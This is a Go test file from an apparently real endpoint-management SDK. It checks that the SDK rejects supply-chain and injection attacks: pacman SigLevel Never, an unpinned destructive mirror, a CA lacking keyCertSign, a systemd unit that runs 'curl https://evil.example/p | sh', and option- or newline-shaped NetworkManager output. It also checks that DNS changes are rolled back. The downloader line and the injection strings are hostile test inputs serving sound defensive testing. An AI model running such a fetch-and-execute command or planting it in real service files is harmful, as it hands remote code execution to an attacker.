package adversary

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"math/big"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/manchtools/power-manage-sdk/pkg"
	"github.com/manchtools/power-manage-sdk/sys/catrust"
	"github.com/manchtools/power-manage-sdk/sys/dns"
	sdkexec "github.com/manchtools/power-manage-sdk/sys/exec"
	"github.com/manchtools/power-manage-sdk/sys/exec/exectest"
	"github.com/manchtools/power-manage-sdk/sys/remote"
	"github.com/manchtools/power-manage-sdk/sys/repo"
	"github.com/manchtools/power-manage-sdk/sys/service"
)

// TestAdversarialSupplyChainTrustMachine covers attack classes that are hard to
// see in package-local tests: trust downgrades, hostile host output reused as
// privileged input, and failed multi-step mutations that leave a foothold behind.
func TestAdversarialSupplyChainTrustMachine(t *testing.T) {
	programs := []attackProgram{
		repositoryTrustDowngradeProgram(),
		trustAnchorAndUnitDropperProgram(),
		hostOutputConfusionProgram(),
		partialSideEffectProgram(),
	}
	for _, program := range programs {
		t.Run(program.name, func(t *testing.T) {
			env := &attackEnv{ctx: context.Background()}
			for _, step := range program.steps {
				t.Run(step.name, func(t *testing.T) {
					checkOracle(t, step, step.run(t, env))
				})
			}
		})
	}
}

func repositoryTrustDowngradeProgram() attackProgram {
	return attackProgram{
		name: "repository trust downgrade",
		// NOTE: apt `Trusted: yes` and dnf `gpgcheck=false` (signature
		// verification disabled) are explicit, documented OPERATOR CHOICES, kept
		// per the 2026-06 policy decision (same as WS8). They are allowed by
		// design and pinned by repo's TestApt_Apply_TrustedNoKey /
		// TestDnf_Apply_GPGCheckFalseIgnoresKey, so they are NOT adversary cases
		// here. The downgrades that ARE refused — pacman SigLevel Never (no valid
		// per-invocation operator semantics) and an unpinned destructive remote
		// mirror — remain below.
		steps: []programStep{
			{
				name:   "Pacman SigLevel Never is rejected before config write",
				oracle: mustReject | noPrivilegedMutation,
				run: func(t *testing.T, _ *attackEnv) observation {
					r := exectest.New(sdkexec.Sudo)
					m, err := repo.New(pkg.Pacman, r)
					if err == nil {
						err = m.Validate(repo.Repository{Name: "corp", Pacman: &repo.PacmanConfig{Server: "https://repo.example/$repo/os/$arch", SigLevel: "Never"}})
					}
					return observation{err: err, commands: r.Calls()}
				},
			},
			{
				name:   "destructive remote mirror needs an integrity pin",
				oracle: mustReject | noNetwork | noDiskMutation,
				run: func(t *testing.T, _ *attackEnv) observation {
					_, err := remote.NewHTTP(remote.HTTPConfig{URL: "https://repo.example/archive.tar.gz", Extract: true, Prune: true})
					return observation{err: err, diskPath: filepath.Join(t.TempDir(), "mirror")}
				},
			},
		},
	}
}

func trustAnchorAndUnitDropperProgram() attackProgram {
	return attackProgram{
		name: "trust anchor and service dropper",
		steps: []programStep{
			{
				name:   "CA without keyCertSign cannot enter system trust",
				oracle: mustReject | noPrivilegedMutation,
				run: func(t *testing.T, env *attackEnv) observation {
					r := exectest.New(sdkexec.Sudo)
					m, err := catrust.New(catrust.CaCertificates, r)
					if err == nil {
						err = m.Install(env.ctx, "corp-root", adversaryCert(t, true, x509.KeyUsageDigitalSignature))
						if err != nil && !errors.Is(err, catrust.ErrInvalidCert) {
							err = nil // reached filesystem/refresh instead of failing at certificate policy
						}
					}
					return observation{err: err, commands: r.Calls()}
				},
			},
			{
				name:   "systemd unit cannot run a shell downloader",
				oracle: mustReject | noPrivilegedMutation,
				run: func(t *testing.T, env *attackEnv) observation {
					r := exectest.New(sdkexec.Sudo)
					m, err := service.New(service.Systemd, r)
					if err == nil {
						err = m.WriteUnit(env.ctx, "pm-dropper.service", "[Service]\nExecStart=/bin/sh -c 'curl https://evil.example/p | sh'\n")
						if err != nil && !errors.Is(err, service.ErrUnsafeUnitContent) {
							err = nil // a host/filesystem failure is not a content-policy rejection; keep only the policy sentinel (mirrors the CA-cert case above)
						}
					}
					return observation{err: err, commands: r.Calls()}
				},
			},
		},
	}
}

func hostOutputConfusionProgram() attackProgram {
	return attackProgram{
		name: "host output confusion",
		steps: []programStep{
			{
				name:   "NetworkManager connection output with newline is rejected before modify",
				oracle: mustReject | noPrivilegedMutation,
				run: func(t *testing.T, env *attackEnv) observation {
					r := exectest.New(sdkexec.Direct)
					r.Push(sdkexec.Result{Stdout: "corp\nconnection\n"}, nil)
					m, err := dns.New(dns.NetworkManager, r)
					if err == nil {
						err = m.Apply(env.ctx, dns.Config{Interface: "wlan0", Nameservers: []string{"10.0.0.53"}})
					}
					return observation{err: err, commands: r.Calls()}
				},
			},
			{
				name:   "NetworkManager connection output with option shape is rejected before modify",
				oracle: mustReject | noPrivilegedMutation,
				run: func(t *testing.T, env *attackEnv) observation {
					r := exectest.New(sdkexec.Direct)
					r.Push(sdkexec.Result{Stdout: "--ask\n"}, nil)
					m, err := dns.New(dns.NetworkManager, r)
					if err == nil {
						err = m.Apply(env.ctx, dns.Config{Interface: "wlan0", Nameservers: []string{"10.0.0.53"}})
					}
					return observation{err: err, commands: r.Calls()}
				},
			},
		},
	}
}

func partialSideEffectProgram() attackProgram {
	return attackProgram{
		name: "partial side-effect rollback",
		steps: []programStep{
			{
				// Apply MUST run `connection modify` to set DNS (TestNM_ApplySuccess
				// requires it), so noPrivilegedMutation is the wrong oracle here.
				// The real guarantee is ROLLBACK: when reactivation (`connection up`)
				// fails after the modify, the staged — possibly attacker-influenced —
				// DNS must not persist in the saved profile. We assert that the final
				// command clears the staged resolver (never leaves 10.0.0.53 staged).
				name:   "NetworkManager reactivation failure rolls back the staged DNS mutation",
				oracle: mustReject,
				run: func(t *testing.T, env *attackEnv) observation {
					r := exectest.New(sdkexec.Direct)
					r.Push(sdkexec.Result{Stdout: "Corp WiFi\n"}, nil)                    // active connection lookup
					r.Push(sdkexec.Result{}, nil)                                         // connection modify (set DNS) succeeds
					r.Push(sdkexec.Result{ExitCode: 1, Stderr: "activation failed"}, nil) // connection up fails
					r.Push(sdkexec.Result{}, nil)                                         // rollback: clear the staged DNS
					m, err := dns.New(dns.NetworkManager, r)
					if err == nil {
						err = m.Apply(env.ctx, dns.Config{Interface: "wlan0", Nameservers: []string{"10.0.0.53"}})
					}
					if err == nil {
						err = errors.New("NetworkManager connection up unexpectedly succeeded")
					}
					cmds := commandStrings(r.Calls())
					last := ""
					if n := len(cmds); n > 0 {
						last = cmds[n-1]
					}
					if !strings.Contains(last, "modify") || strings.Contains(last, "10.0.0.53") {
						t.Errorf("staged DNS was not rolled back after a failed reactivation; final command = %q (all: %v)", last, cmds)
					}
					return observation{err: err, commands: r.Calls(), additionalDetail: strings.Join(cmds, " | ")}
				},
			},
		},
	}
}

func adversaryCert(t *testing.T, isCA bool, usage x509.KeyUsage) []byte {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "adversary-root"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  isCA,
		BasicConstraintsValid: true,
		KeyUsage:              usage,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	return pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
}

func commandStrings(commands []sdkexec.Command) []string {
	out := make([]string, 0, len(commands))
	for _, c := range commands {
		out = append(out, commandString(c))
	}
	return out
}
